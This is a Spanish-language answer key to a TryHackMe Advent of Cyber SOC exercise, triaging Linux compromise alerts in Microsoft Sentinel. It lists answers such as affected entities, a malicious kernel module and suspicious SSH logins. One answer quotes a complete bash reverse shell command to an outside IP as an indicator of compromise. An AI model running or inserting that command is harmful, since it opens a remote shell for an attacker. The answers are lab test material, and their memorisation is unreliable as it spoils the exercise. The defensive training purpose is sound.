# Tinsel Triage (SOC Alert Triaging)

| **Dificultad** | Medium |
| **Tipo** | walkthrough |
| **Slug** | `azuresentinel-aoc2025-a7d3h9k0p2` |
| **Link** | [TryHackMe](https://tryhackme.com/r/room/azuresentinel-aoc2025-a7d3h9k0p2) |
| **Sección** | Advent of Cyber 2025 |
| **Componentes** | Microsoft Sentinel, Azure Security, SOAR, alert triage |
| **Impacto** | Clasificación y triage de alertas de seguridad en entorno cloud |

---

**Contexto:** Microsoft Sentinel es una plataforma SIEM/SOAR en Azure que permite detectar, clasificar y responder a alertas de seguridad. En esta práctica se analizan múltiples alertas de compromiso de sistemas Linux dentro de un entorno empresarial navideño, priorizando la respuesta ante amenazas reales.

## Solucionario

### Task 1: Alert Triage

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert? | `10` |
| 2 | What is the severity of the Linux PrivEsc - Sudo Shadow Access alert? | `High` |
| 3 | How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert? | `4` |

### Task 2: Investigación de sistemas comprometidos

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 4 | What is the name of the kernel module installed in websrv-01? | `malicious_mod.ko` |
| 5 | What is the unusual command executed within websrv-01 by the ops user? | `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1` |

### Task 3: Análisis de acceso y persistencia

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 6 | What is the source IP address of the first successful SSH login to storage-01? | `172.16.0.12` |
| 7 | What is the external source IP that successfully logged in as root to app-01? | `203.0.113.45` |
| 8 | Aside from the backup user, what is the name of the user added to the sudoers group inside app-01? | `deploy` |

---

**Metodología:** Se utilizó Microsoft Sentinel para clasificar alertas de seguridad por severidad y afectación. Se rastrearon indicadores de compromiso (IoCs) como módulos de kernel maliciosos, comandos de reverse shell, y accesos SSH sospechosos. Se correlacionaron las alertas para identificar el alcance real del compromiso.
**Learning chain:** SIEM/SOAR → alert triage → IoC correlation → privilege escalation analysis → persistence detection
**MITRE ATT&CK:** T1053.003 - Scheduled Task/Job: Cron, T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions, T1078.004 - Valid Accounts: Cloud Accounts
**Fuente:** [TryHackMe - Tinsel Triage (SOC Alert Triaging)](https://tryhackme.com/r/room/azuresentinel-aoc2025-a7d3h9k0p2)